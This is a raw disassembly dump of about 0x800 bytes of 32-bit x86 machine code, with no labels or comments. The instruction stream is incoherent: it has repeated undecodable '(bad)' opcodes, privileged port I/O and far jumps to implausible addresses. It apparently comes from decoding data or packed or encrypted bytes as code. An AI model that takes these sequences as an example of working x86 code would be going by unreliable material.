  40424d:	sar    DWORD PTR [edi],cl
  40424f:	retf   
  404250:	aaa    
  404251:	xchg   ecx,eax
  404252:	hlt    
  404253:	rcr    BYTE PTR [eax-0x3a9b1960],0x9f
  40425a:	jp     0x4042c8
  40425c:	ret    
  40425d:	inc    edx
  40425e:	outs   dx,BYTE PTR ds:[esi]
  40425f:	lods   al,BYTE PTR ds:[esi]
  404260:	js     0x404249
  404262:	aaa    
  404263:	jl     0x404276
  404265:	and    DWORD PTR [ebp+0x62],ebx
  404268:	push   0x29
  40426a:	call   0x260f4a1f
  40426f:	fisub  WORD PTR [esi+0x7f]
  404272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404273:	lds    ebx,FWORD PTR [ebx+0x3629aba1]
  404279:	or     eax,0xe3d9037d
  40427e:	adc    bh,BYTE PTR [ecx]
  404280:	jae    0x4042ba
  404282:	mov    ecx,0xc45ccb14
  404287:	fs loopne 0x4042eb
  40428a:	cld    
  40428b:	jecxz  0x404216
  40428d:	mov    esi,0x3d54b6c
  404292:	stos   BYTE PTR es:[edi],al
  404293:	jl     0x404290
  404295:	mov    eax,0x31edd2
  40429a:	sub    BYTE PTR [eax-0xe],bl
  40429d:	xor    DWORD PTR [esi+0x23],esp
  4042a0:	inc    ebp
  4042a1:	jecxz  0x4042de
  4042a3:	call   edi
  4042a5:	add    eax,0x24986f94
  4042aa:	js     0x4042cc
  4042ac:	rol    bl,cl
  4042ae:	test   al,0xf5
  4042b0:	loope  0x40425b
  4042b2:	(bad)  
  4042b3:	push   ds
  4042b4:	das    
  4042b5:	fs cli 
  4042b7:	fwait
  4042b8:	pop    esi
  4042b9:	push   eax
  4042ba:	test   DWORD PTR [ecx+0x36],0xb33d4a03
  4042c1:	xor    edx,DWORD PTR [ebp-0x1a]
  4042c4:	cmp    eax,DWORD PTR [ebp+0x36]
  4042c7:	sbb    bl,BYTE PTR [eax-0x6be864d3]
  4042cd:	mov    ds:0x8ab39ff1,al
  4042d2:	inc    esp
  4042d3:	rol    ch,cl
  4042d5:	cmp    dh,ch
  4042d7:	pop    ecx
  4042d8:	ja     0x40429b
  4042da:	stc    
  4042db:	divps  xmm3,XMMWORD PTR [eax-0x2f818cd7]
  4042e2:	mov    ecx,0xb55a40b6
  4042e7:	fisubr DWORD PTR [ebx+0x1a]
  4042ea:	aaa    
  4042eb:	mov    ebx,0x56e8a8d6
  4042f0:	jb     0x40436b
  4042f2:	mov    bh,BYTE PTR [edi]
  4042f4:	ds stc 
  4042f6:	idiv   DWORD PTR [eax+0x2e]
  4042f9:	jno    0x404318
  4042fb:	or     DWORD PTR [ebp+0x5c],esp
  4042fe:	in     eax,dx
  4042ff:	jmp    0x9d1ddcad
  404304:	mov    dl,0xd7
  404306:	push   0xffffffe7
  404308:	mov    ebp,0x19b1ceef
  40430d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40430e:	les    ebx,FWORD PTR ds:0xb3761cbf
  404314:	jnp    0x404298
  404316:	or     bh,cl
  404318:	inc    eax
  404319:	inc    edi
  40431a:	fmul   QWORD PTR [eax+ebx*1-0x115da635]
  404321:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404322:	mov    bl,0xe9
  404324:	inc    edx
  404325:	jbe    0x40435d
  404327:	pop    esp
  404328:	imul   esi,DWORD PTR [eax-0x4e],0x73
  40432c:	cmp    bl,BYTE PTR [edi]
  40432e:	push   ss
  40432f:	or     esp,edi
  404331:	(bad)  
  404332:	jmp    0x4186:0x7b83a107
  404339:	cmc    
  40433a:	jmp    0x404372
  40433c:	adc    al,0xb2
  40433e:	jns    0x4043aa
  404340:	xchg   esp,eax
  404341:	sbb    BYTE PTR [ecx+esi*4],ch
  404344:	xchg   esp,eax
  404345:	loop   0x4042dc
  404347:	scas   eax,DWORD PTR es:[edi]
  404348:	clc    
  404349:	jnp    0x404373
  40434b:	xchg   edx,eax
  40434c:	mov    esi,0xbab5c4b9
  404351:	xor    al,0x94
  404353:	cmp    al,0x18
  404355:	push   0x4
  404357:	jecxz  0x404311
  404359:	cld    
  40435a:	dec    esi
  40435b:	rol    BYTE PTR [edi+0xd2dc7a7],cl
  404361:	pushf  
  404362:	jb     0x4042ea
  404364:	leave  
  404365:	pushf  
  404366:	jns    0x4043d5
  404368:	cmp    DWORD PTR [eax],ebp
  40436a:	push   eax
  40436b:	mov    esp,0x73659367
  404370:	pop    ecx
  404371:	ret    
  404372:	sbb    eax,0x19f8e711
  404377:	inc    esp
  404378:	sbb    ch,BYTE PTR [eax+0xec5c93c]
  40437e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40437f:	(bad)  
  404381:	dec    esi
  404382:	sti    
  404383:	aam    0xbe
  404385:	bound  esp,QWORD PTR [eax-0x9efce7b]
  40438b:	mov    ch,0xf8
  40438d:	sub    BYTE PTR [edi+0x665caf05],bh
  404393:	repnz pop ds
  404395:	gs sub edi,ebx
  404398:	mov    ecx,0x577e14c2
  40439d:	out    0xc5,al
  40439f:	jno    0x40435e
  4043a1:	jno    0x4043b0
  4043a3:	push   ebx
  4043a4:	xchg   ecx,eax
  4043a5:	mov    ah,0xf5
  4043a7:	data16 cmp ch,BYTE PTR [ebx-0x1c]
  4043ab:	sahf   
  4043ac:	mov    BYTE PTR [esi+0x6966ce29],ah
  4043b2:	jmp    0xaff8cef6
  4043b7:	test   BYTE PTR [ebp-0x54],bh
  4043ba:	fwait
  4043bb:	ret    
  4043bc:	int3   
  4043bd:	ins    DWORD PTR es:[edi],dx
  4043be:	fldenv [ebp+edi*8+0x4db26e2a]
  4043c5:	cdq    
  4043c6:	pop    esp
  4043c7:	sbb    esi,DWORD PTR [ecx]
  4043c9:	ret    0xa09a
  4043cc:	mov    ah,0x95
  4043ce:	hlt    
  4043cf:	popa   
  4043d0:	lea    ebp,[ebx-0x55f8e964]
  4043d6:	repnz stos BYTE PTR es:[edi],al
  4043d8:	cmp    DWORD PTR [ecx+0x57bfb1a8],edx
  4043de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043df:	rol    DWORD PTR [ecx],1
  4043e1:	xchg   DWORD PTR [ebp+0x68f717c1],eax
  4043e7:	pusha  
  4043e8:	and    BYTE PTR [eax],bl
  4043ea:	sbb    BYTE PTR [edx],ch
  4043ec:	adc    eax,0x2d657b26
  4043f1:	les    edi,FWORD PTR [esi+0x45]
  4043f4:	dec    ecx
  4043f5:	mov    ch,0x9c
  4043f8:	pop    esi
  4043f9:	lods   al,BYTE PTR ds:[esi]
  4043fa:	fnstsw WORD PTR [esi+ecx*1-0x5e]
  4043fe:	adc    dh,BYTE PTR [ecx-0x44178f12]
  404404:	sub    DWORD PTR [edx+0x68ff7e9d],esp
  40440a:	inc    edi
  40440b:	push   edx
  40440c:	fcmovbe st,st(3)
  40440e:	inc    ecx
  40440f:	ins    BYTE PTR es:[edi],dx
  404410:	sti    
  404411:	push   esp
  404412:	inc    esi
  404413:	pop    eax
  404414:	fsubr  DWORD PTR [edx-0x4dad1580]
  40441a:	and    eax,ebx
  40441c:	arpl   WORD PTR [ecx+0x6b],sp
  40441f:	add    al,BYTE PTR [eax]
  404421:	xor    ah,BYTE PTR [ebp-0x11d22ec1]
  404427:	inc    edx
  404428:	mov    bh,0xd0
  40442a:	xchg   ebp,eax
  40442b:	repnz mov eax,ds:0x794f1347
  404431:	div    al
  404433:	jecxz  0x404498
  404435:	push   ss
  404436:	test   BYTE PTR [ecx],al
  404438:	adc    eax,0x970270a7
  40443d:	jbe    0x4043f3
  40443f:	out    dx,al
  404440:	push   edi
  404441:	sub    ebp,DWORD PTR [edi-0x64]
  404444:	pushf  
  404445:	idiv   DWORD PTR [edi]
  404447:	call   0x828b62e5
  40444c:	xor    eax,0x617db388
  404451:	sub    dl,BYTE PTR [esi-0x5f]
  404454:	cli    
  404455:	aad    0x11
  404457:	iret   
  404458:	adc    eax,0x3592c66b
  40445d:	adc    DWORD PTR [edi+0x22],edx
  404460:	data16 jno 0x4043e6
  404463:	(bad)  
  404464:	loopne 0x404483
  404466:	test   DWORD PTR [eax+0x16b38978],eax
  40446c:	rol    edi,0xaa
  40446f:	push   edx
  404470:	fisub  WORD PTR [ecx+0x7e]
  404473:	jns    0x404443
  404475:	fnstenv [ecx*4-0x94f87fa]
  40447c:	push   ebp
  40447d:	fidivr WORD PTR [ebp-0x1]
  404480:	mov    bl,0xd9
  404482:	int3   
  404483:	or     BYTE PTR [edx+ebp*2+0x7b751fb9],al
  40448a:	sbb    BYTE PTR [esi],bl
  40448c:	sub    eax,0x207ecb87
  404491:	inc    ebp
  404492:	repz cmp DWORD PTR [edi-0x186c0a59],ebx
  404499:	xchg   esi,ecx
  40449b:	dec    edx
  40449c:	stc    
  40449d:	je     0x4044a3
  40449f:	data16 aad 0x61
  4044a2:	mov    eax,0xb9fa477d
  4044a7:	mov    bh,0x2
  4044a9:	sti    
  4044aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044ab:	jnp    0x40452a
  4044ad:	(bad)  
  4044ae:	xchg   edi,eax
  4044af:	lea    eax,[edi-0x7f]
  4044b2:	gs push cs
  4044b4:	lods   eax,DWORD PTR ds:[esi]
  4044b5:	hlt    
  4044b6:	dec    edi
  4044b7:	mov    eax,0x84815dca
  4044bc:	push   0x59
  4044be:	fs ret 
  4044c0:	cmp    esi,DWORD PTR [edi+0x3a]
  4044c3:	arpl   sp,si
  4044c5:	and    eax,0xc49b62b5
  4044ca:	adc    eax,ecx
  4044cc:	aaa    
  4044cd:	jne    0x4044ca
  4044cf:	imul   edi,DWORD PTR [ebx+0x78],0x33
  4044d3:	ja     0x4044db
  4044d5:	scas   eax,DWORD PTR es:[edi]
  4044d6:	xchg   edi,eax
  4044d7:	or     BYTE PTR [eax],al
  4044d9:	pop    edi
  4044da:	rol    cl,cl
  4044dc:	bound  esp,QWORD PTR [ecx]
  4044de:	aas    
  4044df:	cmp    eax,0x8bb892f5
  4044e4:	jb     0x404469
  4044e6:	in     al,0xe8
  4044e8:	popa   
  4044e9:	dec    esp
  4044ea:	xchg   BYTE PTR [eax-0x52],dl
  4044ed:	jbe    0x404549
  4044ef:	es inc esi
  4044f1:	mov    ch,0x3a
  4044f3:	adc    al,0x68
  4044f5:	hlt    
  4044f6:	lods   eax,DWORD PTR ds:[esi]
  4044f7:	sub    DWORD PTR [esi+0x7bdbb1ba],0x679cfd85
  404501:	rcr    BYTE PTR ds:0xae9a580f,cl
  404507:	add    BYTE PTR [eax-0x286232f4],ch
  40450d:	iret   
  40450e:	pushf  
  40450f:	cwde   
  404510:	fisttp DWORD PTR [eax]
  404512:	push   eax
  404513:	or     al,0x76
  404515:	inc    ebp
  404516:	clc    
  404517:	add    ah,BYTE PTR [edx]
  404519:	xor    al,0x17
  40451b:	adc    bh,BYTE PTR [eax+0x46]
  40451e:	pop    esp
  40451f:	loopne 0x40455e
  404521:	mov    ecx,0x37a85826
  404526:	pop    edi
  404527:	or     bh,BYTE PTR [ebx-0x9324027]
  40452d:	xchg   al,ch
  40452f:	fwait
  404530:	imul   esp,DWORD PTR [edi+0x43bdd001],0x60ef89c4
  40453a:	dec    DWORD PTR [edi]
  40453c:	add    ah,BYTE PTR [ecx+0x1981aa96]
  404542:	push   eax
  404543:	cmp    bh,al
  404545:	pop    ebx
  404546:	mov    DWORD PTR [eax+0x38],ecx
  404549:	push   eax
  40454a:	rcr    BYTE PTR [edx],0x45
  40454d:	mov    ecx,0xe02eeb10
  404552:	repnz aaa 
  404554:	xlat   BYTE PTR ds:[ebx]
  404555:	adc    ecx,ebx
  404557:	push   0x97b2353a
  40455c:	mov    eax,0x57ab278e
  404561:	gs inc esp
  404563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404564:	sub    esi,DWORD PTR [eax+0x4d082189]
  40456a:	(bad)  
  40456b:	call   0x3869:0xe31af9a0
  404572:	shl    dh,cl
  404574:	mov    eax,0xd0b45203
  404579:	in     al,dx
  40457a:	mov    esi,0xf6b9e266
  40457f:	in     al,0x94
  404581:	and    edx,ebx
  404583:	mov    ebx,0x766581b8
  404588:	push   es
  404589:	xor    DWORD PTR [eax+0x2f],eax
  40458c:	xor    al,0x96
  40458e:	in     al,dx
  40458f:	ins    BYTE PTR es:[edi],dx
  404590:	sub    bh,0x2e
  404593:	scas   eax,DWORD PTR es:[edi]
  404594:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404595:	xor    DWORD PTR [edx-0x3ffb23b9],ebp
  40459b:	mov    edx,0xf3924a1f
  4045a0:	outs   dx,BYTE PTR ds:[esi]
  4045a1:	ret    0xcd01
  4045a4:	sub    bl,BYTE PTR [edi-0x8]
  4045a7:	fild   WORD PTR [edi]
  4045a9:	cmp    ecx,DWORD PTR [ecx-0x2588aa83]
  4045af:	mov    ds,WORD PTR [ecx-0x71]
  4045b2:	call   0x72de:0xcd4c579
  4045b9:	push   ebp
  4045ba:	(bad)  [ecx+0x6e]
  4045bd:	mov    ch,0x76
  4045bf:	xchg   DWORD PTR [edi-0xd],eax
  4045c2:	in     eax,0x7d
  4045c4:	mov    ecx,ss
  4045c6:	and    BYTE PTR [ecx+0x64],0xd8
  4045ca:	aaa    
  4045cb:	xchg   edx,eax
  4045cc:	out    0xde,al
  4045ce:	push   0x1a
  4045d0:	pop    ebp
  4045d1:	fdiv   st(6),st
  4045d3:	sti    
  4045d4:	push   ebx
  4045d5:	shl    DWORD PTR [ebx],1
  4045d7:	mov    al,0x8b
  4045d9:	cld    
  4045da:	mov    ds:0x1de07e1,al
  4045df:	xor    eax,0x84c0f2b6
  4045e4:	dec    esp
  4045e5:	adc    DWORD PTR [esi-0x1a4e8bd9],0xffffffd1
  4045ec:	mov    WORD PTR [esi+0x4f],cs
  4045ef:	xchg   ebx,eax
  4045f0:	dec    ebx
  4045f1:	jp     0x404601
  4045f3:	in     al,0x8a
  4045f5:	retf   0xcfa2
  4045f8:	arpl   WORD PTR [ebp+0x45],di
  4045fb:	jge    0x4045a8
  4045fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045fe:	inc    eax
  4045ff:	(bad)  
  404600:	jecxz  0x40459f
  404602:	adc    DWORD PTR [edi],edx
  404604:	pop    ebx
  404605:	adc    al,0x1d
  404607:	jbe    0x404628
  404609:	(bad)  
  40460a:	bound  ebp,QWORD PTR [ebx*8+0x557bbd55]
  404611:	mov    dl,0xc9
  404613:	loop   0x404602
  404615:	lahf   
  404616:	push   cs
  404617:	add    eax,0x31fc0e84
  40461c:	aaa    
  40461d:	jp     0x404680
  40461f:	test   al,0x50
  404621:	repnz sbb eax,0x1749bf6c
  404627:	pop    eax
  404628:	and    edx,DWORD PTR [eax]
  40462a:	xchg   DWORD PTR [ebx],esi
  40462c:	add    al,0x50
  40462e:	fbld   TBYTE PTR [edi-0x33]
  404631:	das    
  404632:	cmp    BYTE PTR [edi],cl
  404634:	jg     0x404691
  404636:	(bad)  
  404638:	sub    eax,0xd9435f3f
  40463d:	jns    0x4046af
  40463f:	sub    dh,BYTE PTR [edi]
  404641:	lods   eax,DWORD PTR ds:[esi]
  404642:	imul   edi,DWORD PTR [edx+0x2d4ca9c4],0xab68e32c
  40464c:	lea    edx,ds:0x5518fc53
  404652:	sub    al,dl
  404654:	sbb    DWORD PTR [edi],edi
  404656:	push   edi
  404657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404658:	add    DWORD PTR [ecx],ebx
  40465a:	inc    eax
  40465b:	popa   
  40465c:	(bad)  
  40465d:	mov    bh,0x48
  40465f:	popf   
  404660:	mov    al,0xae
  404662:	fiadd  WORD PTR [eax-0x2e34e508]
  404668:	inc    esi
  404669:	data16 and al,BYTE PTR [esi-0x1c0850]
  404670:	inc    ecx
  404671:	mov    bl,0xec
  404673:	push   0x774f65d5
  404678:	dec    eax
  404679:	fsubr  QWORD PTR [ecx]
  40467b:	scas   eax,DWORD PTR es:[edi]
  40467c:	sbb    DWORD PTR [ebx+0x9],edi
  40467f:	adc    DWORD PTR [ecx+0x7c882c65],eax
  404685:	aam    0xc7
  404687:	test   eax,0x572e8d87
  40468c:	adc    edx,DWORD PTR [ebx+0x12e4ae27]
  404692:	mov    ds:0xa4161ea0,eax
  404697:	cmp    ah,0xf5
  40469a:	fld    TBYTE PTR [ebp-0x51c9f9d5]
  4046a0:	jbe    0x40464b
  4046a2:	jge    0x404708
  4046a4:	pushf  
  4046a5:	(bad)  
  4046a6:	pop    ds
  4046a7:	fild   DWORD PTR [edi]
  4046a9:	sbb    ebp,edx
  4046ab:	(bad)  
  4046ac:	xor    BYTE PTR [eax+eiz*8+0x18],ch
  4046b0:	arpl   WORD PTR [ebx],dx
  4046b2:	xchg   BYTE PTR ds:0x1981f2d3,bl
  4046b8:	cmp    DWORD PTR [edx],edi
  4046ba:	inc    ebx
  4046bb:	mov    bh,0x5a
  4046bd:	into   
  4046be:	cmp    edi,DWORD PTR [esi+0x5d3529b8]
  4046c4:	js     0x4046d5
  4046c6:	loope  0x4046c4
  4046c8:	les    eax,FWORD PTR [esi+eax*1+0x3c]
  4046cc:	or     eax,0xeeec9cbb
  4046d1:	(bad)
  4046d4:	call   0x36cb:0xdc3a9f0f
  4046db:	dec    ebx
  4046dc:	ins    DWORD PTR es:[edi],dx
  4046dd:	push   ss
  4046de:	sub    BYTE PTR [ebp+eiz*2-0x564f4922],0x59
  4046e6:	fcom   DWORD PTR [esi+eax*1-0x1b]
  4046ea:	and    bl,BYTE PTR [esi]
  4046ec:	inc    DWORD PTR [eax+0x59]
  4046ef:	repnz mov edi,0x2dc060c8
  4046f5:	mov    DWORD PTR [esi+0x17ca8306],edx
  4046fb:	pop    esi
  4046fc:	test   eax,0x47cddcd4
  404701:	scas   eax,DWORD PTR es:[edi]
  404702:	sub    ah,cl
  404704:	loop   0x404715
  404706:	pop    es
  404707:	mov    ds:0x8a7569f9,al
  40470c:	jle    0x4046a8
  40470e:	add    eax,esp
  404710:	mov    bl,dh
  404712:	mov    eax,0x70960cce
  404717:	call   FWORD PTR [bp+di]
  40471a:	pop    ebx
  40471b:	xchg   BYTE PTR [ebx+ebx*1-0x4411097a],cl
  404722:	xchg   esi,eax
  404723:	popf   
  404724:	fild   WORD PTR [edx+0x64]
  404727:	mov    dh,0x38
  404729:	ja     0x40478d
  40472b:	das    
  40472c:	xchg   ebp,eax
  40472d:	ins    BYTE PTR es:[edi],dx
  40472e:	adc    ebx,ebp
  404730:	cwde   
  404731:	(bad)  
  404732:	loopne 0x40478c
  404734:	bound  ecx,QWORD PTR [esi]
  404736:	mov    dh,0xd2
  404738:	pop    esi
  404739:	out    dx,al
  40473a:	dec    ecx
  40473b:	test   BYTE PTR [edx+0x12],dl
  40473e:	loopne 0x4047b5
  404740:	(bad)  [esi+0x1c]
  404743:	out    0xae,eax
  404745:	push   esp
  404746:	sbb    esp,0xcc82b03e
  40474c:	out    0xcd,eax
  40474e:	scas   eax,DWORD PTR es:[edi]
  40474f:	out    0x91,eax
  404751:	mov    eax,ds:0x5768a41c
  404756:	and    DWORD PTR [edi+ebx*1+0x5c789b71],edi
  40475d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40475e:	cli    
  40475f:	add    DWORD PTR [esi],ecx
  404761:	mov    DWORD PTR [edx+edi*1],edi
  404764:	retf   
  404765:	mov    dl,0x8d
  404767:	repz jmp ecx
  40476a:	sbb    eax,DWORD PTR [eax-0x761d2ec7]
  404770:	and    al,0x74
  404772:	arpl   ax,dx
  404774:	out    0xc7,al
  404776:	mov    ecx,0x65737e3a
  40477b:	push   ebp
  40477c:	push   0x75
  40477e:	inc    ebp
  40477f:	jno    0x4047cb
  404781:	popa   
  404782:	mov    eax,ds:0xff6b5b52
  404787:	jmp    FWORD PTR [edi-0x60]
  40478a:	imul   ebx,DWORD PTR [edi+0x7625a9ac],0xffffff9d
  404791:	lods   al,BYTE PTR ds:[esi]
  404792:	aad    0x61
  404794:	push   edi
  404795:	push   esi
  404796:	call   0xcad21cdc
  40479b:	mov    ah,0x39
  40479d:	hlt    
  40479e:	sahf   
  40479f:	adc    eax,0xc1d67fc9
  4047a4:	xor    eax,DWORD PTR [ecx+0x6b835d4]
  4047aa:	pusha  
  4047ab:	push   ecx
  4047ac:	pop    esi
  4047ad:	jl     0x404750
  4047af:	and    dl,ch
  4047b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047b2:	or     eax,0x233e9de6
  4047b7:	mov    cl,0x17
  4047b9:	push   ds
  4047ba:	(bad)  
  4047bb:	jmp    0x4047a2
  4047bd:	or     BYTE PTR [edx+ecx*4+0x42399194],ah
  4047c4:	clc    
  4047c5:	(bad)  
  4047c6:	fmul   st,st(7)
  4047c8:	icebp  
  4047c9:	clc    
  4047ca:	jge    0x4047ad
  4047cc:	mov    edx,0x8f8bf973
  4047d1:	into   
  4047d2:	jp     0x4047d0
  4047d4:	inc    esi
  4047d5:	jmp    0x5535f32d
  4047da:	out    0xb3,eax
  4047dc:	add    bh,BYTE PTR [ecx+eax*4-0x1c9957d5]
  4047e3:	jl     0x404781
  4047e5:	add    esi,eax
  4047e7:	mov    bl,0x82
  4047e9:	(bad)  
  4047eb:	retf   0xc538
  4047ee:	mov    ss,WORD PTR [ecx]
  4047f0:	lods   al,BYTE PTR ds:[esi]
  4047f1:	cdq    
  4047f2:	push   ss
  4047f3:	push   esp
  4047f4:	dec    ebp
  4047f5:	les    edi,FWORD PTR [ecx+0x510f59bb]
  4047fb:	or     al,0x36
  4047fd:	jmp    0xf18c:0xa15bb670
  404804:	mov    ebx,0x3ee9f7b9
  404809:	sub    al,0x34
  40480b:	push   eax
  40480c:	dec    ebp
  40480d:	div    DWORD PTR [ebx]
  40480f:	in     eax,0xbe
  404811:	jb     0x404862
  404813:	inc    ecx
  404814:	xchg   ecx,eax
  404815:	xor    bh,ah
  404817:	pop    ebx
  404818:	ret    
  404819:	fmul   DWORD PTR [ebx+0x43903a16]
  40481f:	(bad)
  404822:	mov    esp,0xf1e73761
  404827:	jae    0x404870
  404829:	fs push edi
  40482b:	mov    ch,0x49
  40482d:	pop    ecx
  40482e:	sahf   
  40482f:	into   
  404830:	mov    BYTE PTR [ecx],ah
  404832:	pop    esi
  404833:	pop    edx
  404834:	sub    edi,DWORD PTR [ebp-0x567c8f63]
  40483a:	mov    edx,0x6ef2831b
  40483f:	or     DWORD PTR [esi-0x3b],edx
  404842:	mov    ds:0x206caadf,eax
  404847:	pop    ecx
  404848:	dec    ecx
  404849:	adc    bl,BYTE PTR [edi]
  40484b:	sbb    eax,DWORD PTR [edi+0x39]
  40484e:	pop    edi
  40484f:	scas   al,BYTE PTR es:[edi]
  404850:	mov    esp,DWORD PTR [esi]
  404852:	jns    0x404835
  404854:	inc    eax
  404855:	sbb    eax,0x5f6c3a25
  40485a:	das    
  40485b:	mov    edi,DWORD PTR [ebp+edi*4-0xd8ea37e]
  404862:	or     DWORD PTR [ecx],edx
  404864:	in     al,dx
  404865:	gs mov dh,0xde
  404868:	out    0xae,eax
  40486a:	mov    DWORD PTR [eax-0x1c5f1fcb],ebx
  404870:	je     0x40481b
  404872:	shl    BYTE PTR [eax-0x2c],0x2d
  404876:	daa    
  404877:	mov    bh,0x92
  404879:	add    eax,0x2aaff1b9
  40487e:	cld    
  40487f:	add    dh,BYTE PTR [ecx+0x1641fb86]
  404885:	mov    eax,0x398165c
  40488a:	test   DWORD PTR [edi+0x9a0dd3b],edi
  404890:	nop
  404891:	clc    
  404892:	call   0x5eac99ef
  404897:	xchg   ebp,eax
  404898:	loope  0x40482c
  40489a:	nop
  40489b:	retf   0xafc4
  40489e:	stos   BYTE PTR es:[edi],al
  40489f:	in     al,dx
  4048a0:	pop    es
  4048a1:	ja     0x404831
  4048a3:	nop
  4048a4:	xchg   esi,eax
  4048a5:	aas    
  4048a6:	xor    ah,0xa5
  4048a9:	push   edx
  4048aa:	pop    esp
  4048ab:	xchg   ebp,eax
  4048ac:	pushf  
  4048ad:	xlat   BYTE PTR ds:[ebx]
  4048ae:	repnz repz sbb al,0xcf
  4048b2:	into   
  4048b3:	jne    0x4048c6
  4048b5:	pop    ebp
  4048b6:	rol    edi,0xec
  4048b9:	jbe    0x404860
  4048bb:	cs aas 
  4048bd:	inc    esi
  4048be:	sub    bl,BYTE PTR [esi-0x184d42c6]
  4048c4:	int    0xe4
  4048c6:	add    DWORD PTR [ecx],0xffffffcc
  4048c9:	jns    0x404897
  4048cb:	punpckhdq mm4,QWORD PTR [ebp+0x10ede3f5]
  4048d2:	jo     0x404900
  4048d4:	jp     0x404858
  4048d6:	mov    ecx,0x6a407059
  4048db:	add    eax,0x63b7c684
  4048e0:	adc    BYTE PTR es:[ebx+0x25155d94],al
  4048e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048e8:	push   eax
  4048e9:	imul   edi,DWORD PTR [ebx*1-0x73e73300],0x2d
  4048f1:	dec    esi
  4048f2:	clc    
  4048f3:	iret   
  4048f4:	retf   0xc180
  4048f7:	enter  0xd724,0x1a
  4048fb:	mov    ah,0xea
  4048fd:	mov    edi,0xf964b867
  404902:	aaa    
  404903:	dec    ecx
  404904:	mov    ebp,0x5bef8077
  404909:	into   
  40490a:	hlt    
  40490b:	loopne 0x4048a4
  40490d:	inc    ebx
  40490e:	das    
  40490f:	add    edx,edx
  404911:	loop   0x404980
  404913:	mov    ah,0xd6
  404915:	cmp    DWORD PTR [eax-0x1f],ebp
  404918:	jp     0x404989
  40491a:	add    eax,0xb0de3b93
  40491f:	(bad)  
  404920:	push   ebp
  404921:	dec    eax
  404922:	xor    al,0x6c
  404924:	jge    0x404919
  404926:	xor    BYTE PTR [esi+ebp*4+0x7d],dl
  40492a:	sbb    BYTE PTR [ebx],0xa4
  40492d:	push   edx
  40492e:	clc    
  40492f:	sti    
  404930:	pop    edx
  404931:	aam    0xb9
  404933:	stos   BYTE PTR es:[edi],al
  404934:	retf   0x7eb6
  404937:	mov    al,0x1a
  404939:	xchg   edx,eax
  40493a:	cmp    edi,eax
  40493c:	fs ins DWORD PTR es:[edi],dx
  40493e:	in     al,0x22
  404940:	rcl    ebx,0xe2
  404943:	inc    esp
  404944:	(bad)  
  404945:	xchg   ebx,eax
  404946:	add    DWORD PTR [edi+eiz*8-0x67bb8e1],ebp
  40494d:	pop    es
  40494e:	loopne 0x4049cc
  404950:	push   eax
  404951:	inc    ebx
  404952:	lahf   
  404953:	in     al,dx
  404954:	shl    BYTE PTR [eax+0x75],0x4f
  404958:	mov    BYTE PTR [edx],al
  40495a:	inc    ebp
  40495b:	add    al,0x2c
  40495d:	mov    ds:0xfc7cac2,al
  404962:	adc    DWORD PTR [esi],edi
  404964:	push   ebx
  404965:	loopne 0x404962
  404967:	pop    DWORD PTR [edx]
  404969:	sbb    DWORD PTR [ebx-0x71a8c3d8],0x14
  404970:	imul   eax,DWORD PTR gs:[edi-0x57],0x27dd126b
  404978:	(bad)  
  404979:	(bad)  [ebp-0x23cf0301]
  40497f:	int3   
  404980:	in     al,dx
  404981:	gs fucomip st,st(0)
  404984:	cli    
  404985:	push   eax
  404986:	mov    ?,WORD PTR [ecx+0x3d]
  404989:	jge    0x4049d6
  40498b:	xor    al,bl
  40498d:	add    eax,0xed4a1dce
  404992:	shl    edx,cl
  404994:	xlat   BYTE PTR ds:[ebx]
  404995:	in     al,dx
  404996:	in     al,0xed
  404998:	jne    0x4049cb
  40499a:	into   
  40499b:	das    
  40499c:	mov    ebp,0x1e1f07d9
  4049a1:	xor    DWORD PTR [edi-0x5caecd84],ebp
  4049a7:	bound  edx,QWORD PTR [ecx]
  4049a9:	cs pop edx
  4049ab:	repz and BYTE PTR [eax-0x7d],0x4b
  4049b0:	test   al,0xd3
  4049b2:	and    esp,DWORD PTR [esp+eax*4]
  4049b5:	add    ebx,edi
  4049b7:	test   DWORD PTR [edi+edx*8+0x74],ebp
  4049bb:	mov    DWORD PTR ds:0x945aece4,0x652261cf
  4049c5:	jecxz  0x4049d8
  4049c7:	sub    al,0x44
  4049c9:	push   0x79
  4049cb:	(bad)  
  4049cc:	push   edx
  4049cd:	iret   
  4049ce:	daa    
  4049cf:	in     al,0x2b
  4049d1:	mov    dh,0x94
  4049d3:	ror    BYTE PTR [eax],cl
  4049d5:	add    BYTE PTR [edi+0x5bf0a603],0x94
  4049dc:	test   BYTE PTR [edi-0x59],ch
  4049df:	cs lock xchg ecx,eax
  4049e2:	lea    edi,[edx-0x56]
  4049e5:	or     DWORD PTR [eax],esp
  4049e7:	lock dec edi
  4049e9:	xchg   esi,eax
  4049ea:	dec    esp
  4049eb:	inc    eax
  4049ec:	test   al,0x33
  4049ee:	arpl   ax,ax
  4049f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049f1:	xchg   edx,eax
  4049f3:	cli    
  4049f4:	shr    DWORD PTR [ebx],cl
  4049f6:	aam    0x9b
  4049f8:	cdq    
  4049f9:	inc    ecx
  4049fa:	in     al,dx
  4049fb:	arpl   di,si
  4049fd:	and    esp,DWORD PTR [edx+0x786d8cda]
  404a03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a04:	mov    ecx,0xf013bfc0
  404a09:	push   edx
  404a0a:	gs cs cli 
  404a0d:	add    eax,0xbd272ca8
  404a12:	xchg   edi,eax
  404a13:	data16 sub al,0x78
  404a16:	cmp    eax,0x50405e45
  404a1b:	pop    ecx
  404a1c:	stc    
  404a1d:	imul   ecx,ecx,0xffffffbd
  404a20:	stos   BYTE PTR es:[edi],al
  404a21:	cmp    edi,DWORD PTR es:[edx+0x67a8567c]
  404a28:	jg     0x4049c9
  404a2a:	int    0x30
  404a2c:	cwde   
